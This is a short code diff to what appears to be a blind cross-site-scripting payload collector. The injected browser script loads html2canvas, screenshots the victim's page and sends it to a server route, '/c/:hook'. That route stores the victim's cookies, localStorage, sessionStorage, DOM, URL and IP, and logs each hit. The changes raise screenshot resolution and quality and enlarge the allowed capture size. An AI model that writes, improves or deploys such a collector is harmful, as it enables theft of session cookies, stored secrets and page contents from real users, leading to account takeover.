@@ -146,8 +146,8 @@ try{
   h.src="${baseUrl}/h2c.js";
   h.onload=function(){
     try{
-      html2canvas(document.documentElement,{logging:false,allowTaint:true,useCORS:true,scale:0.5,timeout:8000}).then(function(cv){
-        try{d.screenshot=cv.toDataURL("image/jpeg",0.75);}catch(e){}
+      html2canvas(document.documentElement,{logging:false,allowTaint:true,useCORS:true,scale:Math.max(1,window.devicePixelRatio||1),timeout:8000}).then(function(cv){
+        try{d.screenshot=cv.toDataURL("image/jpeg",0.92);}catch(e){}
         send();
       }).catch(function(){send();});
     }catch(e){send();}
@@ -190,7 +190,7 @@ app.post('/c/:hook', (req, res) => {
       trunc(p.uri, 4096), trunc(p.cookies, 8192), trunc(p.referrer, 2048),
       trunc(p['user-agent'], 512), trunc(p.origin, 512), trunc(p.lang, 64),
       trunc(p.gpu, 256), trunc(p.localstorage, 65536), trunc(p.sessionstorage, 65536),
-      trunc(p.dom, 524288), trunc(p.screenshot, 1048576)
+      trunc(p.dom, 524288), trunc(p.screenshot, 8388608)
     );
   console.log(`[+] ${hook}  ${ip}  ${trunc(p.uri, 80)}`);
   res.setHeader('Access-Control-Allow-Origin', '*');
